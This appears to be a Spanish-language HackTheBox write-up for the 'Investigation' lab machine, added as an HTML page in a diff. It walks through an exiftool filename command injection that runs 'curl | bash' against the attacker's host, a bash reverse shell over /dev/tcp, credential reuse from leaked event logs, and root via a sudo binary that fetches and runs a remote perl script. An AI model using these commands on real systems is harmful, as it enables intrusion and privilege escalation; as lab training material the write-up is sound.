@@ -1,0 +1,286 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Investigation HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/investigation.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Investigation HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Investigation de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Investigation de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Investigation HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Investigation HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Investigation de la plataforma de HackTheBox","headline":"Writeup Investigation HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Investigation HackTheBox</h1>
+          <p>Resolución de la máquina Investigation de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.197
+Nmap scan report for 10.10.11.197
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http</span>
+</code></pre></div></div>
+
+<div><p>Al hacer un simple curl y mirar las cabeceras podemos ver el dominio eforenzics.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s 10.10.11.197 -I | </span><span class="s2">grep</span><span class="p"> Location
+Location: </span><span class="kd">http://eforenzics.htb/</span>
+</code></pre></div></div>
+
+<div><p>Dandole un vistazo a la web nos ofrecen una prueba gratis del servicio de forense</p></div>
+<a href="./1.png" target="_blank"><div><p><img src="./1.png"><p></div></a>
+
+<div><p>Haciendo clic en Go! nos lleva a una pagina donde podemos subir archivos</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Podemos seleccionar una imagen png cualquiera y darle a subir en la web que nos ofrece</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Al darle a upload nos dice que se ha subido y nos da un boton de here para ver el resultado</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Lo abrimos y es un output de exiftool, pero nos lekeea la version (12.37)</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Encontramos un <a href="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429">poc</a>, la vulnerabilidad está en el nombre asi que copiamos en png con un nombre que nos haga un curl a nuestro host y el output lo ejecute con bash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cp </span><span class="p">image.png </span><span class="no">'curl 10.10.14.10 | bash |'</span>
+</code></pre></div></div>
+
+<div><p>Como index definimos una reverse shell ya que la vulnerabilidad lo ejecutara con bash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">index.html
+bash -i >& /dev/tcp/10.10.14.10/443 0>&1
+
+</span><span class="s2">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div>
+
+<div><p>Subimos el archivo y recibimos una shell como www-data en la máquina real</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.197
+</span><span class="s2">www-data@investigation</span><span class="p">:</span><span class="na">~/uploads/1674415004</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@investigation</span><span class="p">:</span><span class="na">~/uploads/1674415004</span><span class="p">$ hostname -I
+10.10.11.197
+</span><span class="s2">www-data@investigation</span><span class="p">:</span><span class="na">~/uploads/1674415004</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Buscando archivos de los que somos propietarios podemos ver una ruta /usr/local/investigation</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -user www-data 2>/dev/null | grep -vE 'run|proc|var'
+/usr/local/investigation/analysed_log
+/dev/pts/0
+</span><span class="s2">www-data@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Entramos a la carpeta donde podemos ver un .msg que es un mensaje de Microsoft Outlook</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$ cd /usr/local/investigation
+</span><span class="s2">www-data@investigation</span><span class="p">:</span><span class="na">/usr/local/investigation</span><span class="p">$ ls -l
+-rw-rw-r-- 1 smorton  smorton  1308160 Oct  1 00:35 'Windows Event Logs for Analysis.msg'
+-rw-rw-r-- 1 www-data www-data       0 Oct  1 00:40  analysed_log
+</span><span class="s2">www-data@investigation</span><span class="p">:</span><span class="na">/usr/local/investigation</span><span class="p">$ file 'Windows Event Logs for Analysis.msg'
+Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message
+</span><span class="s2">www-data@investigation</span><span class="p">:</span><span class="na">/usr/local/investigation</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos abrirlo con Outlook y ver el mensaje, tambien un archivo zip que nos comparte</p></div>
+<a href="./7.png" target="_blank"><div><p><img src="./7.png"><p></div></a>
+
+<div><p>Al descomprimirlo podemos ver un archivo llamado security.evtx</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ unzip </span><span class="p">evtx-logs.zip
+Archive:  evtx-logs.zip
+  inflating: security.evtx</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar <a href="https://github.com/omerbenamram/evtx/">evtx_dump</a> para dumpear los datos del archivo compartido</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ./evtx_dump </span><span class="p">security.evtx -o json > dump</span>
+</code></pre></div></div>
+
+<div><p>En las lineas TargetUsername del dump podemos ver un usuario y lo que parece una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ grep </span><span class="p">TargetUserName dump | </span><span class="s2">sort</span><span class="p"> -u | </span><span class="s2">tr </span><span class="p">-d \", | </span><span class="s2">awk</span><span class="no"> '{print $2}' </span><span class="p">|</span><span class="s2"> grep</span><span class="p"> -vE </span><span class="no">'UMFD|DWM'</span><span class="p">
+-
+aanderson
+AAnderson
+AAnderson
+Administrator
+Administrators
+AWright
+Backup
+BMay
+DefaultAccount
+</span><span class="kd">Def@ultf0r3nz!csPa$$</span><span class="p">
+EFORENZICS-DI$
+EKora
+Guest
+hmarley
+HMarley
+HMarley
+hmraley
+IPerez
+JClark
+KTyson
+ljenkins
+LJenkins
+LJenkins
+lmonroe
+LMonroe
+LMonroe
+LOCAL
+</span><span class="kd">smorton</span><span class="p">
+SMorton
+SMorton
+SYSTEM
+WDAGUtilityAccount</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar las credenciales para conectarnos por ssh y conseguimos shell como smorton</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">smorton@10.10.11.197
+smorton@10.10.11.197's password: </span><span class="kd">Def@ultf0r3nz!csPa$$</span><span class="p">
+</span><span class="s2">smorton@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(smorton) gid=1000(smorton) groups=1000(smorton)
+</span><span class="s2">smorton@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.197
+</span><span class="s2">smorton@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+946**************************a70
+</span><span class="s2">smorton@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>MIrando privilegios de sudoers podemos ver un binario llamado binary</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">smorton@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+Matching Defaults entries for smorton on investigation:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User smorton may run the following commands on investigation:
+    (</span><span class="na">root</span><span class="p">) NOPASSWD: </span><span class="kd">/usr/bin/binary</span><span class="p">
+</span><span class="s2">smorton@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Con ayuda de ghidra podemos abrir el binario y abrir la función main</p></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>Al abrirlo en la parte derecha podemos ver todo el codigo de la función decompilado</p></div>
+<div><p><img src="./9.png"><p></div>
+
+<div><p>En una parte del codigo podemos ver que verifica que el total de parametros sea 3, quiere decir que ademas del binario necesitamos otros 2 parametros</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">if </span><span class="p">(param_1 </span><span class="kd">!=</span><span class="na"> 3</span><span class="p">) {
+  </span><span class="k">puts</span><span class="p">(</span><span class="s2">"Exiting... "</span><span class="p">);
+  </span><span class="k">exit</span><span class="p">(</span><span class="na">0</span><span class="p">);
+}</span>
+</code></pre></div></div>
+
+<div><p>También en otra parte podemos ver que compara que el uid sea igual a 0 (que sea root quien lo ejecuta), si la condicion falla hace exactamente lo mismo que antes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">_Var1 </span><span class="kd">=</span><span class="p"> getuid();
+</span><span class="kd">if </span><span class="p">(_Var1 </span><span class="kd">!= </span><span class="na">0</span><span class="p">) {
+  </span><span class="k">puts(</span><span class="s2">"Exiting... "</span><span class="p">)
+  </span><span class="k">exit</span><span class="p">(</span><span class="na">0</span><span class="p">);
+}</span>
+</code></pre></div></div>
+
+<div><p>En otra parte podemos ver que verifica que el segundo parametro sea lDnxUysaQn si la condicion no se cumple también hace lo mismo que antes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">iVar2 </span><span class="kd">=</span><span class="k"> strcmp</span><span class="p">(</span><span class="kd">*</span><span class="p">(</span><span class="k">char </span><span class="kd">**</span><span class="p">)(param_2 </span><span class="kd">+</span><span class="na"> 0x10</span><span class="p">),</span><span class="s2">"lDnxUysaQn"</span><span class="p">);
+</span><span class="kd">if</span><span class="p"> (iVar2 </span><span class="kd">!=</span><span class="na"> 0</span><span class="p">) {
+  </span><span class="k">puts</span><span class="p">(</span><span class="s2">"Exiting... "</span><span class="p">);
+  </span><span class="k">exit</span><span class="p">(</span><span class="na">0</span><span class="p">);
+}</span>
+</code></pre></div></div>
+
+<div><p>Si las condiciones se cumplen usa la funcion curl para leer un archivo de un recurso web que podemos especificar en el primer paranetro y lo guarda en el archivo abierto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">puts</span><span class="p">(</span><span class="s2">"Running... "</span><span class="p">);
+__stream </span><span class="kd">=</span><span class="k"> fopen</span><span class="p">(</span><span class="kd">*</span><span class="p">(</span><span class="k">char </span><span class="kd">**</span><span class="p">)(param_2 </span><span class="kd">+</span><span class="na"> 0x10</span><span class="p">),</span><span class="s2">"wb"</span><span class="p">);
+uVar3 </span><span class="kd">=</span><span class="p"> curl_easy_init();
+curl_easy_setopt(uVar3,</span><span class="na">0x2712</span><span class="p">,</span><span class="kd">*</span><span class="p">(undefined8 </span><span class="kd">*</span><span class="p">)(param_2 </span><span class="kd">+</span><span class="na"> 8</span><span class="p">));
+curl_easy_setopt(uVar3,</span><span class="na">0x2711</span><span class="p">,__stream);
+curl_easy_setopt(uVar3,</span><span class="na">0x2d</span><span class="p">,</span><span class="na">1</span><span class="p">);
+iVar2 </span><span class="kd">=</span><span class="p"> curl_easy_perform(uVar3);</span>
+</code></pre></div></div>
+
+<div><p>Si en este punto sigue el flujo, ejecutara el archivo guardado del recurso web con perl</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">if</span><span class="p"> (iVar2 </span><span class="kd">==</span><span class="na"> 0</span><span class="p">) {
+  iVar2 </span><span class="kd">=</span><span class="k"> snprintf</span><span class="p">((</span><span class="k">char</span><span class="kd"> *</span><span class="p">)</span><span class="na">0x0</span><span class="p">,</span><span class="na">0</span><span class="p">,</span><span class="s2">"%s"</span><span class="p">,</span><span class="kd">*</span><span class="p">(undefined8 </span><span class="kd">*</span><span class="p">)(param_2 </span><span class="kd">+</span><span class="na"> 0x10</span><span class="p">));
+  __s </span><span class="kd">=</span><span class="p"> (</span><span class="k">char</span><span class="kd"> *</span><span class="p">)</span><span class="l">malloc</span><span class="p">((</span><span class="k">long</span><span class="p">)iVar2 </span><span class="kd">+</span><span class="na"> 1</span><span class="p">);
+  </span><span class="k">snprintf</span><span class="p">(__s,(</span><span class="k">long</span><span class="p">)iVar2 </span><span class="kd">+</span><span class="na"> 1</span><span class="p">,</span><span class="s2">"%s"</span><span class="p">,</span><span class="kd">*</span><span class="p">(undefined8 </span><span class="kd">*</span><span class="p">)(param_2 </span><span class="kd">+</span><span class="na"> 0x10</span><span class="p">));
+  iVar2 </span><span class="kd">=</span><span class="k"> snprintf</span><span class="p">((</span><span class="k">char</span><span class="kd"> *</span><span class="p">)</span><span class="na">0x0</span><span class="p">,</span><span class="na">0</span><span class="p">,</span><span class="s2">"perl ./%s"</span><span class="p">,__s);
+  __s_00 </span><span class="kd">=</span><span class="p"> (</span><span class="k">char </span><span class="kd">*</span><span class="p">)</span><span class="k">malloc</span><span class="p">((</span><span class="k">long</span><span class="p">)iVar2 </span><span class="kd">+</span><span class="na"> 1</span><span class="p">);
+  </span><span class="k">snprintf</span><span class="p">(__s_00,(</span><span class="k">long</span><span class="p">)iVar2 </span><span class="kd">+</span><span class="na"> 1</span><span class="p">,</span><span class="s2">"perl ./%s"</span><span class="p">,__s);
+  </span><span class="k">fclose</span><span class="p">(__stream);
+  curl_easy_cleanup(uVar3);
+  setuid(</span><span class="na">0</span><span class="p">);
+  </span><span class="k">system</span><span class="p">(__s_00);
+  </span><span class="k">system</span><span class="p">(</span><span class="s2">"rm -f ./lDnxUysaQn"</span><span class="p">);
+  </span><span class="kd">return</span><span class="na"> 0</span><span class="p">;
+}</span>
+</code></pre></div></div>
+
+<div><p>Para explotar esto, creamos un archivo pl que ejecute 'su' y lo compartimos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> pwned.pl
+exec("su")
+
+</span><span class="s2">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div>
+
+<div><p>Finalmente ejecutamos el binario con los argumentos que sabemos que necesitamos y al ejecutar su nos lanza una bash como root, hemos completado la máquina</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">smorton@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo binary http://10.10.14.10/pwned.pl lDnxUysaQn
+Running... 
+</span><span class="s2">root@investigation</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@investigation</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.10.11.197
+</span><span class="s2">root@investigation</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/root.txt 
+063**************************48d
+</span><span class="s2">root@investigation</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
